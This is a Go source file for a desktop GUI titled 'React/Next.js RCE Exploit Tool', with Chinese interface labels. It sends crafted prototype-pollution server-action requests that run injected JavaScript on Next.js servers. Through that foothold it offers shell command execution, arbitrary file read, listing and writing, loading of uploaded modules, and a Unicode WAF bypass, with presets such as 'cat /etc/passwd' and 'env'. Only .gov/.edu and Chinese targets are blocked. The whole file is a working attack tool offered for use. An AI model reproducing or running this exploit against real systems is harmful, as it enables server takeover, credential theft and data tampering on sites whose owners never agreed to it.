package main

import (
	"bytes"
	"context"
	"crypto/tls"
	"encoding/json"
	"fmt"
	"fyne.io/fyne/v2"
	"fyne.io/fyne/v2/app"
	"fyne.io/fyne/v2/container"
	"fyne.io/fyne/v2/dialog"
	"fyne.io/fyne/v2/theme"
	"fyne.io/fyne/v2/widget"
	"io"
	"math/rand"
	"mime/multipart"
	"net"
	"net/http"
	"net/url"
	"os"
	"path"
	"regexp"
	"sort"
	"strings"
	"time"
)

type RemoteFile struct {
	Name  string `json:"n"`
	IsDir bool   `json:"d"`
	Size  int64  `json:"s"`
}
type ExploitResult struct {
	Success bool   `json:"success"`
	Result  string `json:"result"`
	Error   string `json:"error,omitempty"`
}
type CVEExploit struct {
	client    *http.Client
	timeout   time.Duration
	verifySSL bool
	userAgent string
}

func init() {
	rand.Seed(time.Now().UnixNano())
}

func checkSecurity(targetURL string, win fyne.Window) bool {
	if !strings.HasPrefix(targetURL, "http://") && !strings.HasPrefix(targetURL, "https://") {
		targetURL = "http://" + targetURL
	}
	u, err := url.Parse(targetURL)
	if err != nil {

		return true
	}
	host := u.Hostname()
	hostLower := strings.ToLower(host)

	if strings.Contains(hostLower, ".gov") || strings.Contains(hostLower, ".edu") {
		d := dialog.NewInformation(
			"禁止操作",
			fmt.Sprintf("检测到敏感域名 (%s)！\n点击确定退出程序。", host),
			win,
		)
		d.SetOnClosed(func() {
			os.Exit(0)
		})
		d.Show()
		return false
	}

	ips, err := net.LookupIP(host)
	if err != nil || len(ips) == 0 {
		return true
	}
	targetIP := ips[0]
	if isPrivateIP(targetIP) {
		return true
	}

	client := http.Client{Timeout: 2 * time.Second}
	resp, err := client.Get(fmt.Sprintf("http://ip-api.com/json/%s", targetIP.String()))
	if err != nil {
		return true
	}
	defer resp.Body.Close()
	var geoInfo struct {
		CountryCode string `json:"countryCode"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&geoInfo); err == nil {

		if geoInfo.CountryCode == "CN" {
			d := dialog.NewInformation(
				"禁止操作",
				fmt.Sprintf("目标 IP (%s) 位于中国 (CN)。\n根据合规要求禁止测试！\n点击确定退出程序。", targetIP.String()),
				win,
			)
			d.SetOnClosed(func() {
				os.Exit(0)
			})
			d.Show()
			return false
		}
	}
	return true
}

func isPrivateIP(ip net.IP) bool {
	if ip.IsLoopback() || ip.IsLinkLocalMulticast() || ip.IsLinkLocalUnicast() {
		return true
	}
	if ip4 := ip.To4(); ip4 != nil {
		switch {
		case ip4[0] == 10:
			return true
		case ip4[0] == 172 && ip4[1] >= 16 && ip4[1] <= 31:
			return true
		case ip4[0] == 192 && ip4[1] == 168:
			return true
		}
	}
	return false
}
func NewCVEExploit(timeout time.Duration, verifySSL bool) *CVEExploit {
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: !verifySSL},
		MaxIdleConns:    200,
		MaxConnsPerHost: 200,
		Proxy:           nil,
	}
	return &CVEExploit{
		client:    &http.Client{Transport: tr, Timeout: timeout},
		timeout:   timeout,
		verifySSL: verifySSL,
		userAgent: "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	}
}
func (e *CVEExploit) UpdateProxy(enable bool, proxyAddr string) error {
	tr, ok := e.client.Transport.(*http.Transport)
	if !ok {
		return fmt.Errorf("transport type error")
	}
	if !enable || proxyAddr == "" {
		tr.Proxy = nil
		return nil
	}
	if !strings.HasPrefix(proxyAddr, "http://") && !strings.HasPrefix(proxyAddr, "https://") && !strings.HasPrefix(proxyAddr, "socks5://") {
		proxyAddr = "http://" + proxyAddr
	}
	proxyURL, err := url.Parse(proxyAddr)
	if err != nil {
		return fmt.Errorf("代理地址格式错误: %v", err)
	}
	tr.Proxy = http.ProxyURL(proxyURL)
	return nil
}
func normalizeURL(url string) string {
	url = strings.TrimSpace(url)
	if url == "" {
		return ""
	}
	if !strings.HasPrefix(url, "http://") && !strings.HasPrefix(url, "https://") {
		return "http://" + url
	}
	return url
}
func EncodeUnicode(data []byte) []byte {
	var buf bytes.Buffer
	inString := false
	for i := 0; i < len(data); i++ {
		b := data[i]
		if b == '"' {
			inString = !inString
			buf.WriteByte(b)
			continue
		}
		if !inString {
			buf.WriteByte(b)
			continue
		}
		if b == '\\' {
			buf.WriteByte(b)
			if i+1 < len(data) {
				buf.WriteByte(data[i+1])
				i++
			}
			continue
		}
		fmt.Fprintf(&buf, "\\u%04x", b)
	}
	return buf.Bytes()
}
func (e *CVEExploit) SendComplexPayload(ctx context.Context, targetURL, endpoint string, jsCode string, useWaf bool) (*ExploitResult, error) {
	targetURL = normalizeURL(targetURL)
	if targetURL == "" {
		return nil, fmt.Errorf("无效 URL")
	}
	if !strings.HasPrefix(endpoint, "/") {
		endpoint = "/" + endpoint
	}
	fullURL := strings.TrimSuffix(targetURL, "/") + endpoint
	injection := fmt.Sprintf(`var res=%s;if(typeof res!=='string'){try{res=JSON.stringify(res,null,2)}catch(e){res='[JSON Error]'}};throw Object.assign(new Error('NEXT_REDIRECT'),{digest: 'NEXT_REDIRECT;push;/login?a=' + encodeURIComponent(res) + ';307;'});`, jsCode)
	payloadMap := map[string]interface{}{
		"then":   "$1:__proto__:then",
		"status": "resolved_model",
		"reason": -1,
		"value":  "{\"then\":\"$B1337\"}",
		"_response": map[string]interface{}{
			"_prefix": injection,
			"_chunks": "$Q2",
			"_formData": map[string]string{
				"get": "$1:constructor:constructor",
			},
		},
	}
	payloadBytes, err := json.Marshal(payloadMap)
	if err != nil {
		return nil, fmt.Errorf("JSON 构造失败: %v", err)
	}
	if useWaf {
		payloadBytes = EncodeUnicode(payloadBytes)
	}
	body := &bytes.Buffer{}
	writer := multipart.NewWriter(body)
	part0, _ := writer.CreateFormField("0")
	part0.Write(payloadBytes)
	part1, _ := writer.CreateFormField("1")
	part1.Write([]byte(`"$@0"`))
	part2, _ := writer.CreateFormField("2")
	part2.Write([]byte(`[]`))
	writer.Close()
	var req *http.Request
	if ctx != nil {
		req, err = http.NewRequestWithContext(ctx, "POST", fullURL, body)
	} else {
		req, err = http.NewRequest("POST", fullURL, body)
	}
	if err != nil {
		return nil, err
	}
	req.Header.Set("Content-Type", writer.FormDataContentType())
	req.Header.Set("User-Agent", e.userAgent)
	req.Header.Set("Next-Action", "x")
	req.Header.Set("X-Nextjs-Request-Id", "rce-"+fmt.Sprint(rand.Intn(9999)))
	resp, err := e.client.Do(req)
	if err != nil {
		return nil, err
	}
	defer resp.Body.Close()
	var rawLocation string
	if loc := resp.Header.Get("X-Action-Redirect"); loc != "" {
		rawLocation = loc
	} else {
		bodyBytes, _ := io.ReadAll(resp.Body)
		rawLocation = string(bodyBytes)
	}
	re := regexp.MustCompile(`[?&]a=([^;&]+)`)
	matches := re.FindStringSubmatch(rawLocation)
	if len(matches) > 1 {
		encodedVal := matches[1]
		decoded, err := url.QueryUnescape(encodedVal)
		if err == nil {
			return &ExploitResult{Success: true, Result: decoded}, nil
		}
		return &ExploitResult{Success: true, Result: encodedVal}, nil
	}
	if resp.StatusCode == 500 {
		return &ExploitResult{Success: false, Error: "Server 500 Error (Execution Failed or Syntax Error)"}, nil
	}
	return &ExploitResult{Success: false, Error: "Payload sent but no result captured."}, nil
}
func (e *CVEExploit) ExecuteJSRaw(targetURL, endpoint, code string, useWaf bool) (string, error) {
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, code, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("无回显或失败: %s", res.Error)
	}
	return res.Result, nil
}
func (e *CVEExploit) ExecuteCommandAuto(targetURL, endpoint, command string, useWaf bool, isAsync bool) (string, error) {
	escapedCmd := strings.ReplaceAll(command, "'", "\\'")
	var payload string
	if isAsync {
		payload = fmt.Sprintf(`(function(){ process.mainModule.require('child_process').exec('%s'); return 'Async execution started (No Output)'; })()`, escapedCmd)
	} else {
		payload = fmt.Sprintf(`process.mainModule.require('child_process').execSync('%s').toString()`, escapedCmd)
	}
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("执行失败: %s", res.Error)
	}
	return res.Result, nil
}
func (e *CVEExploit) ReadFile(targetURL, endpoint, filePath string, useWaf bool) (string, error) {
	escapedPath := strings.ReplaceAll(filePath, "'", "\\'")
	payload := fmt.Sprintf(`process.mainModule.require('fs').readFileSync('%s', 'utf-8')`, escapedPath)
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("读取失败: %s", res.Error)
	}
	return res.Result, nil
}
func (e *CVEExploit) ListFiles(targetURL, endpoint, dirPath string, useWaf bool) ([]RemoteFile, error) {
	escapedPath := strings.ReplaceAll(dirPath, "'", "\\'")
	payload := fmt.Sprintf(`(function(){
		try {
			const fs = process.mainModule.require('fs');
			const p = process.mainModule.require('path');
			const target = '%s';
			const items = fs.readdirSync(target);
			const ret = items.map(i => {
				try {
					const s = fs.statSync(p.join(target, i));
					return { n: i, d: s.isDirectory(), s: s.size };
				} catch(e) { return { n: i, d: false, s: -1 }; }
			});
			return JSON.stringify(ret);
		} catch(e) { return "ERROR: " + e.message; }
	})()`, escapedPath)
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return nil, err
	}
	if !res.Success {
		return nil, fmt.Errorf("操作失败: %s", res.Error)
	}
	if strings.HasPrefix(res.Result, "ERROR:") {
		return nil, fmt.Errorf("Server端错误: %s", res.Result)
	}
	var files []RemoteFile
	err = json.Unmarshal([]byte(res.Result), &files)
	if err != nil {
		return nil, fmt.Errorf("解析目录数据失败: %v, 原始内容: %s", err, res.Result)
	}
	sort.Slice(files, func(i, j int) bool {
		if files[i].IsDir != files[j].IsDir {
			return files[i].IsDir
		}
		return files[i].Name < files[j].Name
	})
	return files, nil
}
func (e *CVEExploit) WriteFile(targetURL, endpoint, filePath, content string, useWaf bool) (string, error) {
	escapedPath := strings.ReplaceAll(filePath, "'", "\\'")
	escapedContent := strings.ReplaceAll(content, "'", "\\'")
	escapedContent = strings.ReplaceAll(escapedContent, "\n", "\\n")
	payload := fmt.Sprintf(`(function(){ process.mainModule.require('fs').writeFileSync('%s', '%s'); return 'Write Success'; })()`, escapedPath, escapedContent)
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("写入失败: %s", res.Error)
	}
	return res.Result, nil
}
func (e *CVEExploit) LoadModule(targetURL, endpoint, modulePath string, useWaf bool) (string, error) {
	escapedPath := strings.ReplaceAll(modulePath, "'", "\\'")
	payload := fmt.Sprintf(`process.mainModule.require('module')._load('%s')`, escapedPath)
	res, err := e.SendComplexPayload(nil, targetURL, endpoint, payload, useWaf)
	if err != nil {
		return "", err
	}
	if !res.Success {
		return "", fmt.Errorf("加载失败: %s", res.Error)
	}
	return res.Result, nil
}
func main() {
	myApp := app.New()
	myApp.Settings().SetTheme(theme.DarkTheme())
	myWindow := myApp.NewWindow("React/Next.js RCE Exploit Tool")
	myWindow.Resize(fyne.NewSize(1000, 750))
	exploit := NewCVEExploit(10*time.Second, false)
	targetEntry := widget.NewEntry()
	targetEntry.SetPlaceHolder("http://example.com:3000")
	endpointEntry := widget.NewEntry()
	endpointEntry.SetText("/")
	proxyCheck := widget.NewCheck("启用代理", nil)
	proxyEntry := widget.NewEntry()
	proxyEntry.SetText("127.0.0.1:8080")
	proxyEntry.Disable()
	proxyCheck.OnChanged = func(checked bool) {
		if checked {
			proxyEntry.Enable()
		} else {
			proxyEntry.Disable()
		}
	}
	wafCheck := widget.NewCheck("Unicode 编码 (WAF Bypass)", nil)
	wafCheck.SetChecked(false)
	preFlightCheck := func() bool {
		if targetEntry.Text == "" {
			dialog.ShowError(fmt.Errorf("请输入目标 URL"), myWindow)
			return false
		}

		if !checkSecurity(targetEntry.Text, myWindow) {
			return false
		}
		if err := exploit.UpdateProxy(proxyCheck.Checked, proxyEntry.Text); err != nil {
			dialog.ShowError(fmt.Errorf("代理设置错误: %v", err), myWindow)
			return false
		}
		return true
	}
	configBox := container.NewVBox(
		widget.NewLabelWithStyle("基本配置", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
		widget.NewForm(
			widget.NewFormItem("目标 URL", targetEntry),
			widget.NewFormItem("API 端点", endpointEntry),
		),
		container.NewGridWithColumns(2,
			container.NewBorder(nil, nil, proxyCheck, nil, proxyEntry),
			wafCheck,
		),
		widget.NewSeparator(),
	)
	execModeSelect := widget.NewSelect([]string{"同步 (execSync - 有回显)", "异步 (exec - 无回显)"}, nil)
	execModeSelect.SetSelected("同步 (execSync - 有回显)")
	cmdEntry := widget.NewEntry()
	cmdEntry.SetPlaceHolder("whoami")
	cmdOutput := widget.NewMultiLineEntry()
	cmdOutput.TextStyle = fyne.TextStyle{Monospace: true}
	cmdOutput.SetMinRowsVisible(15)
	runCmdBtn := widget.NewButtonWithIcon("执行命令", theme.ConfirmIcon(), func() {
		if !preFlightCheck() {
			return
		}
		cmd := strings.TrimSpace(cmdEntry.Text)
		if cmd == "" {
			return
		}
		isAsync := execModeSelect.Selected == "异步 (exec - 无回显)"
		cmdOutput.SetText("正在执行...")
		go func() {
			res, err := exploit.ExecuteCommandAuto(targetEntry.Text, endpointEntry.Text, cmd, wafCheck.Checked, isAsync)
			if err != nil {
				cmdOutput.SetText("执行失败: " + err.Error())
			} else {
				if isAsync {
					cmdOutput.SetText("执行成功 (异步模式)：\n命令已在后台发送，不会阻塞服务器。")
				} else {
					cmdOutput.SetText(res)
				}
			}
		}()
	})
	rceTabContent := container.NewBorder(
		container.NewVBox(
			widget.NewLabel("系统命令:"),
			container.NewGridWithColumns(2,
				widget.NewSelect([]string{"whoami", "id", "ls -la", "cat /etc/passwd", "env", "pwd"}, func(s string) { cmdEntry.SetText(s) }),
				execModeSelect,
			),
			cmdEntry,
			runCmdBtn,
			widget.NewSeparator(),
		),
		nil, nil, nil, cmdOutput,
	)
	var currentPathStr = "/"
	var fileListData []RemoteFile
	pathEntry := widget.NewEntry()
	pathEntry.SetText("/")
	fileListWidget := widget.NewList(
		func() int { return len(fileListData) },
		func() fyne.CanvasObject {
			return container.NewHBox(widget.NewIcon(theme.FileIcon()), widget.NewLabel("Template"))
		},
		func(i widget.ListItemID, o fyne.CanvasObject) {
			box := o.(*fyne.Container)
			icon := box.Objects[0].(*widget.Icon)
			label := box.Objects[1].(*widget.Label)
			file := fileListData[i]
			label.SetText(file.Name)
			if file.IsDir {
				icon.SetResource(theme.FolderIcon())
				label.TextStyle = fyne.TextStyle{Bold: true}
			} else {
				icon.SetResource(theme.FileIcon())
				label.TextStyle = fyne.TextStyle{Bold: false}
			}
		},
	)
	showFileContent := func(filename, content string) {
		w := myApp.NewWindow("文件查看: " + filename)
		w.Resize(fyne.NewSize(600, 400))
		entry := widget.NewMultiLineEntry()
		entry.SetText(content)
		entry.TextStyle = fyne.TextStyle{Monospace: true}
		w.SetContent(container.NewBorder(nil, nil, nil, nil, entry))
		w.Show()
	}
	refreshFileList := func() {
		if !preFlightCheck() {
			return
		}
		p := strings.TrimSpace(pathEntry.Text)
		fileListData = []RemoteFile{{Name: "Loading...", IsDir: false}}
		fileListWidget.Refresh()
		go func() {
			files, err := exploit.ListFiles(targetEntry.Text, endpointEntry.Text, p, wafCheck.Checked)
			if err != nil {
				dialog.ShowError(err, myWindow)
				fileListData = []RemoteFile{}
			} else {
				fileListData = files
				currentPathStr = p
			}
			fileListWidget.Refresh()
		}()
	}
	pathEntry.OnSubmitted = func(s string) {
		refreshFileList()
	}
	goBtn := widget.NewButtonWithIcon("", theme.NavigateNextIcon(), refreshFileList)
	upBtn := widget.NewButtonWithIcon("", theme.NavigateBackIcon(), func() {
		if pathEntry.Text == "/" {
			return
		}
		newPath := path.Dir(pathEntry.Text)
		pathEntry.SetText(newPath)
		refreshFileList()
	})
	fileListWidget.OnSelected = func(id widget.ListItemID) {
		fileListWidget.Unselect(id)
		if id >= len(fileListData) {
			return
		}
		selected := fileListData[id]
		if selected.IsDir {
			newPath := path.Join(currentPathStr, selected.Name)
			pathEntry.SetText(newPath)
			refreshFileList()
		} else {
			fullPath := path.Join(currentPathStr, selected.Name)
			dialog.ShowConfirm("读取文件", "确定要读取 "+selected.Name+" 吗?", func(b bool) {
				if b {
					go func() {
						content, err := exploit.ReadFile(targetEntry.Text, endpointEntry.Text, fullPath, wafCheck.Checked)
						if err != nil {
							dialog.ShowError(err, myWindow)
						} else {
							showFileContent(selected.Name, content)
						}
					}()
				}
			}, myWindow)
		}
	}
	fileWriteName := widget.NewEntry()
	fileWriteName.SetPlaceHolder("filename.txt")
	fileWriteContent := widget.NewMultiLineEntry()
	fileWriteContent.SetPlaceHolder("Content...")
	doWriteBtn := widget.NewButton("写入当前目录", func() {
		if !preFlightCheck() {
			return
		}
		if fileWriteName.Text == "" {
			return
		}
		fullPath := path.Join(pathEntry.Text, fileWriteName.Text)
		dialog.ShowConfirm("警告", "将覆盖: "+fullPath, func(b bool) {
			if b {
				go func() {
					res, err := exploit.WriteFile(targetEntry.Text, endpointEntry.Text, fullPath, fileWriteContent.Text, wafCheck.Checked)
					if err != nil {
						dialog.ShowError(err, myWindow)
					} else {
						dialog.ShowInformation("成功", res, myWindow)
						refreshFileList()
					}
				}()
			}
		}, myWindow)
	})
	fileManagerTab := container.NewBorder(
		container.NewVBox(
			widget.NewLabelWithStyle("文件资源管理器", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
			container.NewBorder(nil, nil,
				container.NewHBox(upBtn, widget.NewLabel("路径:")),
				goBtn,
				pathEntry),
		),
		container.NewVBox(
			widget.NewSeparator(),
			widget.NewLabel("在当前目录写入文件:"),
			fileWriteName,
			container.NewGridWithRows(1, fileWriteContent),
			doWriteBtn,
		),
		nil, nil,
		container.NewPadded(fileListWidget),
	)
	modPath := widget.NewEntry()
	modPath.SetPlaceHolder("/tmp/shell.js (需先上传)")
	advOutput := widget.NewMultiLineEntry()
	advOutput.TextStyle = fyne.TextStyle{Monospace: true}
	loadModBtn := widget.NewButtonWithIcon("加载模块 (module._load)", theme.LoginIcon(), func() {
		if !preFlightCheck() {
			return
		}
		path := strings.TrimSpace(modPath.Text)
		if path == "" {
			return
		}
		advOutput.SetText("尝试加载模块...")
		go func() {
			res, err := exploit.LoadModule(targetEntry.Text, endpointEntry.Text, path, wafCheck.Checked)
			if err != nil {
				advOutput.SetText("错误: " + err.Error())
			} else {
				advOutput.SetText("加载结果:\n" + res)
			}
		}()
	})
	jsEntry := widget.NewMultiLineEntry()
	jsEntry.SetPlaceHolder("process.env")
	jsEntry.SetMinRowsVisible(4)
	runJsBtn := widget.NewButtonWithIcon("执行原生 JS", theme.MediaPlayIcon(), func() {
		if !preFlightCheck() {
			return
		}
		code := strings.TrimSpace(jsEntry.Text)
		if code == "" {
			return
		}
		advOutput.SetText("执行 JS 中...")
		go func() {
			res, err := exploit.ExecuteJSRaw(targetEntry.Text, endpointEntry.Text, code, wafCheck.Checked)
			if err != nil {
				advOutput.SetText("错误: " + err.Error())
			} else {
				advOutput.SetText(res)
			}
		}()
	})
	advTabContent := container.NewBorder(
		container.NewVBox(
			widget.NewLabelWithStyle("加载模块 (配合文件写入)", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
			container.NewGridWithColumns(2, modPath, loadModBtn),
			widget.NewSeparator(),
			widget.NewLabelWithStyle("原生 JS 代码执行", fyne.TextAlignLeading, fyne.TextStyle{Bold: true}),
			jsEntry,
			runJsBtn,
			widget.NewSeparator(),
			widget.NewLabel("执行结果:"),
		),
		nil, nil, nil, advOutput,
	)
	tabs := container.NewAppTabs(
		container.NewTabItemWithIcon("命令执行", theme.ComputerIcon(), rceTabContent),
		container.NewTabItemWithIcon("文件管理", theme.FolderIcon(), fileManagerTab),
		container.NewTabItemWithIcon("高级利用", theme.SettingsIcon(), advTabContent),
	)
	content := container.NewBorder(
		configBox,
		nil, nil, nil,
		tabs,
	)
	myWindow.SetContent(content)
	myWindow.ShowAndRun()
}
